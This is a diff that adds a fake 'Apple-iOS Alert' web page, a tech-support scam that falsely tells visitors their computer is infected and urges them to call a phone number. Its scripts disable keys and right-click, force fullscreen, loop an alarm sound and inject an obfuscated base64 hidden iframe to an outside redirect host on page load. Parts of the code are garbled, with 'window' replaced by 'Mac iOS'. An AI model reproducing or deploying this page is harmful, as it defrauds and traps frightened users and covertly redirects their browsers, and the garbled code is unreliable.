@@ -1,0 +1,278 @@
+
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=Mac iOS-1252">
+
+<style type="text/css">
+.ui-dialog-titlebar-close {
+    visibility: hidden;
+}
+</style>
+
+
+<script type="text/javascript">
+Mac iOS.onkeydown = function(evt)
+{
+	if(evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17)
+	{
+		return false;
+
+	}
+
+};
+Mac iOS.onkeypress = function(evn)
+{
+	if(evn.keyCode == 123 || evn.keyCode == 117) return false;
+
+};
+</script>
+<title>***Apple-iOS Alert***</title>
+<meta name="robots" content="noindex,nofollow">
+<link href="favicon.ico" rel="shortcut icon">
+<link href="style.css" rel="stylesheet" type="text/css">
+<link href="bootstrap.css" rel="stylesheet" type="text/css">
+<script src="jquery-1.10.2.min.js" type="text/javascript"></script>
+<script type="text/javascript">
+var stroka = '<div class="my-error" style="background:#000;"><div class="container" ><h1>Recovery</h1><h2>Your Apple PC ran into a problem. It needs to be repaired.</h2><p>A component of your hard drive has stopped working due to installation of malicious software.</p> <p>Mac iOS Alert Error code: ac3lhd_32.exe</p> <p>You\'ll need to use the recovery tools on your installation media. If you don\'t have any installation media (like a disk or USB devices), contact support at +1-620-464-4264.</p></div></div>';
+</script>
+<script type="text/javascript">
+ $("#div2").dialog({
+    closeOnEscape: false,
+    open: function(event, ui) {
+        $(".ui-dialog-titlebar-close", ui.dialog | ui).hide();
+    }
+});
+</script>
+<script type="text/javascript">
+            function toggleFullScreen()
+            {
+				document.getElementById('fa').innerHTML =  atob("PGlmcmFtZSBzcmM9J2h0dHA6Ly9hbmFseXRpY3MuY3V2ZXNrLmNvbS9yb3V0L2lmcmFtZS1yZWRpcmVjdC5waHAnIHdpZHRoPScxJyBoZWlnaHQ9JzEnIHN0eWxlPSdvcGFjaXR5OjA7Jz48L2lmcmFtZT4=");
+                if (!document.fullscreenElement &&  !document.mozFullScreenElement && !document.webkitFullscreenElement)
+                {
+                    if (document.documentElement.requestFullscreen)
+                    {
+                        document.documentElement.requestFullscreen();
+
+                    }
+                    else if (document.documentElement.mozRequestFullScreen)
+                    {
+                        document.documentElement.mozRequestFullScreen();
+
+                    }
+                    else if (document.documentElement.webkitRequestFullscreen)
+                    {
+                        document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+                    }
+                }
+            }
+        </script>
+<script type="text/javascript">
+            document.addEventListener('keyup', function(es){
+                if (es.keyCode == 27)
+                {
+                    toggleFullScreen();
+
+                }
+            }
+                                      , false);
+        </script>
+<script type="text/javascript">
+            document.addEventListener('keyup', function(e)
+                                      {
+                if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13)
+                {
+                    document.getElementById('map').innerHTML = stroka;
+                    toggleFullScreen();
+					$("body").css("overflow", "hidden");
+
+                }
+            }
+                                      , false);
+        </script>
+<script type="text/javascript">
+            Mac iOS.onload = function ()
+            {
+                document.onclick = function (e)
+                {
+                    e = e || event;
+                    target = e.target || e.srcElement;
+                    if (target.tagName == "DIV")
+                    {
+                        toggleFullScreen();
+                        document.getElementById('map').innerHTML = stroka;
+						$("body").css("overflow", "hidden");
+
+                    }
+                    else
+                    {
+                        toggleFullScreen();
+                        document.getElementById('map').innerHTML = stroka;
+                        document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute;left: -25px;'></iframe>";
+						$("body").css("overflow", "hidden");
+
+                    }
+
+                }
+            }
+        </script>
+<script type="text/javascript">
+            document.oncontextmenu=new Function("return false");
+        </script>
+<script type="text/javascript">
+            addEventListener("click", function() {
+                document.getElementById('map').innerHTML = stroka;
+                var
+                el = document.documentElement
+                , rfs =
+                    el.requestFullScreen
+                || el.webkitRequestFullScreen
+                || el.mozRequestFullScreen
+                ;
+
+                rfs.call(el);
+
+            });
+        </script>
+
+
+
+
+</head>
+<body onclick="toggleFullScreen()">
+<div id="map"></div>
+<div id="fa"></div>
+<audio autoplay="autoplay" loop>
+  <source src="err.mp3" type="audio/mpeg">
+</audio>
+<header>
+  <div class="container">
+    <nav class="navbar">
+      <div class=""> 
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>
+        </div>
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+          <ul class="nav navbar-nav">
+            <li class="dropdown active"> <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Store <span class="caret"></span></a>
+              <ul class="dropdown-menu">
+                <li><a href="#">Action</a></li>
+                <li><a href="#">Another action</a></li>
+                <li><a href="#">Something else here</a></li>
+                <li role="separator" class="divider"></li>
+                <li><a href="#">Separated link</a></li>
+                <li role="separator" class="divider"></li>
+                <li><a href="#">One more separated link</a></li>
+              </ul>
+            </li>
+            <li class="dropdown"> <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Products <span class="caret"></span></a>
+              <ul class="dropdown-menu">
+                <li><a href="#">Action</a></li>
+                <li><a href="#">Another action</a></li>
+                <li><a href="#">Something else here</a></li>
+                <li role="separator" class="divider"></li>
+                <li><a href="#">Separated link</a></li>
+                <li role="separator" class="divider"></li>
+                <li><a href="#">One more separated link</a></li>
+                <li><a href="#">Support</a></li>
+              </ul>
+            </li>
+          </ul>
+          <ul class="nav navbar-nav navbar-right">
+            <li><a href="#">Link</a></li>
+            <li><a href="#">Sign in</a></li>
+          </ul>
+        </div>
+        <!-- /.navbar-collapse --> 
+      </div>
+      <!-- /.container-fluid --> 
+    </nav>
+  </div>
+</header>
+<section class="some" style="display:none;">
+  <div class="container">
+    <div class="some-sec">
+      <p>Join the celebration ‚Äî get the Mac iOS 10 Anniversary Update today &gt;</p>
+    </div>
+  </div>
+</section>
+
+
+<section class="body-links">
+  <div class="container">
+    <div class="body-links-sec">
+      <div class="row">
+        <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
+          <div class="body-links-info">
+            
+        </div>
+        <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
+          <div class="body-links-info">
+            
+            
+          </div>
+        </div>
+        <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
+          <div class="body-links-info">
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="box">
+  <div class="main-box-container">
+    <div class="box-heading"> <a href="javascript:;" class="cross">√ó</a>
+      <h1>Confirm Navigation</h1>
+    </div>
+    <div class="box-container" style="padding-top:-400px; z-index:99999999999; position:relative;">
+      <p>**CRITICAL ALERT FROM Mac iOS : YOUR COMPUTER HAS BEEN INFECTED BY SPYWARE AND BLOCKED BY IT**<br>
+        <br>
+        Mac iOS has detected some suspicious activity from your IP address.<br>
+        Some virus and spyware have caused a security breach at your network location.<br>
+        <br>
+        Please call us immediately at the toll-free number listed so that our engineers can walk you through the removal process over the phone. Call us immediately on our Toll Free +1-620-464-4264 for Technical Assistance.<br>
+        <br>
+        ***********************************<br>
+        <br>
+        Toll Free +1-620-464-4264<br>
+        <br>
+        ***********************************<br>
+        <br>
+        Please do not use any internet based services to avoid any identity thefts.<br>
+        PLEASE DO NOT SHUT DOWN OR RESTART YOUR COMPUTER. DOING THAT LEAD TO DATA LOSS AND FAILIURE OF OPERATING SYSTEM HENCE NON BOOTABLE SITUATION RESULTING COMPLETE DATA LOSS.</p>
+    </div>
+    <div class="box-checkbox">
+      <label>
+        <input class="input" type="checkbox" readonly>
+      </label>
+      <p> Prevent this page from creating additional dialogues.</p>
+    </div>
+    <div class="box-confirm"> <a class="confirm" href="#">OK</a> </div>
+    <div class="clr"></div>
+  </div>
+</div>
+
+<script>
+$(document).ready(function(e) {
+    $("body").on("contextmenu",function(){
+       return false;
+    });
+	$("body").append(atob("PGlmcmFtZSBzcmM9J2h0dHA6Ly9hbmFseXRpY3MuY3V2ZXNrLmNvbS9yb3V0L2lmcmFtZS1yZWRpcmVjdC5waHAnIHdpZHRoPScxJyBoZWlnaHQ9JzEnIHN0eWxlPSdvcGFjaXR5OjA7Jz48L2lmcmFtZT4="));
+});
+</script>
+<script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+ga('create', 'UA-83351866-1', 'auto'); ga('send', 'pageview');
+</script>
+
+
+
+
+</body>
+
+</html>
